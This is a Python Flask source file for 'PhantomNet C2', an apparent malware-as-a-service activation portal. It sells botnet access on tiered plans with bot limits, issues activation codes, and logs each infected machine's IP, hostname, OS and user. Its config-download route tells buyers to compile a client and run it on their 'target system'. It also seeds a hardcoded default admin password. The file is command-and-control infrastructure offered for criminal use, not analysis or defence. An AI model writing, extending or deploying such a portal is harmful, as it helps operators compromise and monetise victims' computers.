#!/usr/bin/env python3
"""
PhantomNet C2 - Activation Portal
Public activation system with admin panel for customer management
"""

import sqlite3
import hashlib
import secrets
import time
import json
import os
from datetime import datetime, timedelta
from flask import Flask, request, jsonify, render_template, redirect, url_for, session, flash
from flask_sqlalchemy import SQLAlchemy
from werkzeug.security import generate_password_hash, check_password_hash
import qrcode
from io import BytesIO
import base64

app = Flask(__name__)
app.secret_key = secrets.token_urlsafe(32)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///phantom_activation.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

# Database Models
class Admin(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password_hash = db.Column(db.String(120), nullable=False)
    email = db.Column(db.String(120), unique=True, nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    is_active = db.Column(db.Boolean, default=True)

class Customer(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password_hash = db.Column(db.String(120), nullable=False)
    email = db.Column(db.String(120), unique=True, nullable=False)
    company = db.Column(db.String(120))
    plan = db.Column(db.String(20), default='basic')  # basic, pro, enterprise
    max_bots = db.Column(db.Integer, default=10)
    activation_codes = db.relationship('ActivationCode', backref='customer', lazy=True)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    expires_at = db.Column(db.DateTime)
    is_active = db.Column(db.Boolean, default=True)

class ActivationCode(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    code = db.Column(db.String(32), unique=True, nullable=False)
    customer_id = db.Column(db.Integer, db.ForeignKey('customer.id'), nullable=False)
    bot_id = db.Column(db.String(50))
    is_used = db.Column(db.Boolean, default=False)
    used_at = db.Column(db.DateTime)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    expires_at = db.Column(db.DateTime)

class BotRegistration(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    activation_code = db.Column(db.String(32), db.ForeignKey('activation_code.code'), nullable=False)
    bot_id = db.Column(db.String(50), unique=True, nullable=False)
    ip_address = db.Column(db.String(45))
    hostname = db.Column(db.String(100))
    os_info = db.Column(db.String(100))
    username = db.Column(db.String(100))
    registered_at = db.Column(db.DateTime, default=datetime.utcnow)
    last_seen = db.Column(db.DateTime)
    status = db.Column(db.String(20), default='active')

# Create database tables
with app.app_context():
    db.create_all()
    
    # Create default admin if not exists
    if not Admin.query.filter_by(username='admin').first():
        admin = Admin(
            username='admin',
            password_hash=generate_password_hash('phantom_admin_2024'),
            email='admin@phantomnet.com'
        )
        db.session.add(admin)
        db.session.commit()

# Utility functions
def generate_activation_code():
    """Generate unique activation code"""
    return secrets.token_urlsafe(16).upper()

def create_qr_code(data):
    """Create QR code for activation code"""
    qr = qrcode.QRCode(version=1, box_size=10, border=5)
    qr.add_data(data)
    qr.make(fit=True)
    
    img = qr.make_image(fill_color="black", back_color="white")
    buffer = BytesIO()
    img.save(buffer, format='PNG')
    buffer.seek(0)
    
    return base64.b64encode(buffer.getvalue()).decode()

# Public routes
@app.route('/')
def public_index():
    """Public landing page"""
    return render_template('public/index.html')

@app.route('/activate', methods=['GET', 'POST'])
def activate():
    """Public activation page"""
    if request.method == 'POST':
        activation_code = request.form.get('activation_code', '').strip().upper()
        
        if not activation_code:
            flash('Please enter an activation code', 'error')
            return render_template('public/activate.html')
        
        # Check if activation code exists and is valid
        code = ActivationCode.query.filter_by(code=activation_code).first()
        
        if not code:
            flash('Invalid activation code', 'error')
            return render_template('public/activate.html')
        
        if code.is_used:
            flash('This activation code has already been used', 'error')
            return render_template('public/activate.html')
        
        if code.expires_at and code.expires_at < datetime.utcnow():
            flash('This activation code has expired', 'error')
            return render_template('public/activate.html')
        
        # Generate bot ID and session token
        bot_id = f"PHANTOM_{secrets.token_urlsafe(8).upper()}"
        session_token = secrets.token_urlsafe(32)
        encryption_key = secrets.token_urlsafe(32)
        
        # Mark code as used
        code.is_used = True
        code.used_at = datetime.utcnow()
        code.bot_id = bot_id
        
        # Register bot
        bot_reg = BotRegistration(
            activation_code=activation_code,
            bot_id=bot_id,
            ip_address=request.remote_addr,
            registered_at=datetime.utcnow(),
            status='active'
        )
        
        db.session.add(bot_reg)
        db.session.commit()
        
        # Store in session for download
        session['bot_config'] = {
            'bot_id': bot_id,
            'session_token': session_token,
            'encryption_key': encryption_key,
            'server_url': request.host_url.rstrip('/') + ':8443'
        }
        
        flash('Activation successful! Download your bot configuration below.', 'success')
        return redirect(url_for('download_config'))
    
    return render_template('public/activate.html')

@app.route('/download-config')
def download_config():
    """Download bot configuration"""
    if 'bot_config' not in session:
        return redirect(url_for('activate'))
    
    config = session['bot_config']
    
    # Create configuration file content
    config_content = f"""# PhantomNet C2 Bot Configuration
BOT_ID={config['bot_id']}
SESSION_TOKEN={config['session_token']}
ENCRYPTION_KEY={config['encryption_key']}
SERVER_URL={config['server_url']}

# Instructions:
# 1. Compile the client.cpp file with the following command:
#    g++ -o phantom_client.exe client.cpp -lcurl -lcrypto -lssl -static -O2 -s
# 2. Replace the SERVER_URL in client.cpp with: {config['server_url']}
# 3. Run the compiled executable on your target system
"""
    
    response = app.response_class(
        config_content,
        mimetype='text/plain',
        headers={'Content-Disposition': f'attachment; filename=phantom_config_{config["bot_id"]}.txt'}
    )
    
    return response

@app.route('/register', methods=['GET', 'POST'])
def register():
    """Customer registration page"""
    if request.method == 'POST':
        username = request.form.get('username')
        email = request.form.get('email')
        password = request.form.get('password')
        company = request.form.get('company')
        
        if not all([username, email, password, company]):
            flash('All fields are required', 'error')
            return render_template('public/register.html')
        
        # Check if user already exists
        if Customer.query.filter_by(username=username).first():
            flash('Username already exists', 'error')
            return render_template('public/register.html')
        
        if Customer.query.filter_by(email=email).first():
            flash('Email already registered', 'error')
            return render_template('public/register.html')
        
        # Create customer
        customer = Customer(
            username=username,
            password_hash=generate_password_hash(password),
            email=email,
            company=company,
            expires_at=datetime.utcnow() + timedelta(days=30)  # 30-day trial
        )
        
        db.session.add(customer)
        db.session.commit()
        
        flash('Registration successful! Please contact admin for activation codes.', 'success')
        return redirect(url_for('customer_login'))
    
    return render_template('public/register.html')

@app.route('/customer/login', methods=['GET', 'POST'])
def customer_login():
    """Customer login page"""
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        customer = Customer.query.filter_by(username=username).first()
        
        if customer and check_password_hash(customer.password_hash, password):
            if not customer.is_active:
                flash('Account is deactivated', 'error')
                return render_template('public/customer_login.html')
            
            if customer.expires_at and customer.expires_at < datetime.utcnow():
                flash('Account has expired', 'error')
                return render_template('public/customer_login.html')
            
            session['customer_id'] = customer.id
            session['customer_username'] = customer.username
            return redirect(url_for('customer_dashboard'))
        else:
            flash('Invalid username or password', 'error')
    
    return render_template('public/customer_login.html')

@app.route('/customer/dashboard')
def customer_dashboard():
    """Customer dashboard"""
    if 'customer_id' not in session:
        return redirect(url_for('customer_login'))
    
    customer = Customer.query.get(session['customer_id'])
    if not customer:
        session.clear()
        return redirect(url_for('customer_login'))
    
    # Get customer's bots
    bots = BotRegistration.query.join(ActivationCode).filter(
        ActivationCode.customer_id == customer.id
    ).all()
    
    # Get activation codes
    codes = ActivationCode.query.filter_by(customer_id=customer.id).all()
    
    return render_template('customer/dashboard.html', 
                         customer=customer, 
                         bots=bots, 
                         codes=codes)

@app.route('/customer/logout')
def customer_logout():
    """Customer logout"""
    session.clear()
    return redirect(url_for('public_index'))

# Admin routes
@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    """Admin login page"""
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        admin = Admin.query.filter_by(username=username).first()
        
        if admin and check_password_hash(admin.password_hash, password):
            session['admin_id'] = admin.id
            session['admin_username'] = admin.username
            return redirect(url_for('admin_dashboard'))
        else:
            flash('Invalid credentials', 'error')
    
    return render_template('admin/login.html')

@app.route('/admin/dashboard')
def admin_dashboard():
    """Admin dashboard"""
    if 'admin_id' not in session:
        return redirect(url_for('admin_login'))
    
    # Get statistics
    total_customers = Customer.query.count()
    total_bots = BotRegistration.query.count()
    active_bots = BotRegistration.query.filter_by(status='active').count()
    total_codes = ActivationCode.query.count()
    used_codes = ActivationCode.query.filter_by(is_used=True).count()
    
    # Get recent activity
    recent_bots = BotRegistration.query.order_by(BotRegistration.registered_at.desc()).limit(10).all()
    recent_customers = Customer.query.order_by(Customer.created_at.desc()).limit(10).all()
    
    return render_template('admin/dashboard.html',
                         total_customers=total_customers,
                         total_bots=total_bots,
                         active_bots=active_bots,
                         total_codes=total_codes,
                         used_codes=used_codes,
                         recent_bots=recent_bots,
                         recent_customers=recent_customers)

@app.route('/admin/customers')
def admin_customers():
    """Manage customers"""
    if 'admin_id' not in session:
        return redirect(url_for('admin_login'))
    
    customers = Customer.query.order_by(Customer.created_at.desc()).all()
    return render_template('admin/customers.html', customers=customers)

@app.route('/admin/customers/<int:customer_id>')
def admin_customer_detail(customer_id):
    """Customer detail view"""
    if 'admin_id' not in session:
        return redirect(url_for('admin_login'))
    
    customer = Customer.query.get_or_404(customer_id)
    bots = BotRegistration.query.join(ActivationCode).filter(
        ActivationCode.customer_id == customer.id
    ).all()
    codes = ActivationCode.query.filter_by(customer_id=customer.id).all()
    
    return render_template('admin/customer_detail.html', 
                         customer=customer, 
                         bots=bots, 
                         codes=codes)

@app.route('/admin/customers/<int:customer_id>/add-codes', methods=['POST'])
def admin_add_codes(customer_id):
    """Add activation codes for customer"""
    if 'admin_id' not in session:
        return redirect(url_for('admin_login'))
    
    customer = Customer.query.get_or_404(customer_id)
    num_codes = int(request.form.get('num_codes', 1))
    
    for _ in range(num_codes):
        code = ActivationCode(
            code=generate_activation_code(),
            customer_id=customer.id,
            expires_at=datetime.utcnow() + timedelta(days=365)
        )
        db.session.add(code)
    
    db.session.commit()
    flash(f'Added {num_codes} activation codes for {customer.username}', 'success')
    
    return redirect(url_for('admin_customer_detail', customer_id=customer.id))

@app.route('/admin/customers/<int:customer_id>/toggle-status', methods=['POST'])
def admin_toggle_customer_status(customer_id):
    """Toggle customer active status"""
    if 'admin_id' not in session:
        return redirect(url_for('admin_login'))
    
    customer = Customer.query.get_or_404(customer_id)
    customer.is_active = not customer.is_active
    db.session.commit()
    
    status = 'activated' if customer.is_active else 'deactivated'
    flash(f'Customer {customer.username} {status}', 'success')
    
    return redirect(url_for('admin_customers'))

@app.route('/admin/logout')
def admin_logout():
    """Admin logout"""
    session.clear()
    return redirect(url_for('admin_login'))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
